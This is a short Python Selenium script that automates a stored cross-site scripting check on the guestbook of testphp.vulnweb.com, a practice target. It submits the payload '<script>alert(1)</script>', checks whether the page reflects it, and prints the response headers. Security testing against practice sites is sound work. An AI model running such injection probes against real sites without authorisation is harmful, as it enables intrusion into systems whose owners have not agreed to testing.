#https://selenium-python.readthedocs.io/locating-elements.html

import unittest
import os
import time
import re
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

options = Options()
options.add_argument("no-sandbox")
options.add_argument("headless")
options.add_argument("start-maximized")
options.add_argument("window-size=1900,1080"); 


class PythonOrgSearch():


    def __init__(self, driver = webdriver.Chrome(chrome_options=options, executable_path="/usr/bin/chromedriver"), payload= None,):

        self.driver = driver
        self.payload = payload


    def main(self):
        try :
             
             self.driver.get("http://testphp.vulnweb.com/guestbook.php")

             textarea = self.driver.find_element(By.XPATH, "//textarea[1]")
             textarea.send_keys(self.payload)
              
             message = self.driver.find_element(By.NAME, "submit")
             message.click()
             self.driver.switch_to.alert.accept()
             time.sleep(0.5)

             source = self.driver.page_source

             #print(source)
             if self.payload in source:
                  Regex = re.compile(r'.{,10}%s.{,10}' % re.escape(self.payload), re.IGNORECASE)
                  print(Regex.findall(source))
                  #print(source)
                  headers = self.driver.execute_script("var req = new XMLHttpRequest();req.open('GET', document.location, false);req.send(null);return req.getAllResponseHeaders()")
                  headers = headers.splitlines()
                  print(headers)
                  
             else:
                 print("not found it") 
             
             self.tearDown()

        except : 
             self.tearDown()


    def tearDown(self):
        self.driver.close()
        self.driver.quit()
        os.system("killall chromium")



PythonOrgSearch(payload= "<script>alert(1)</script>").main()
os.system("killall chromium")
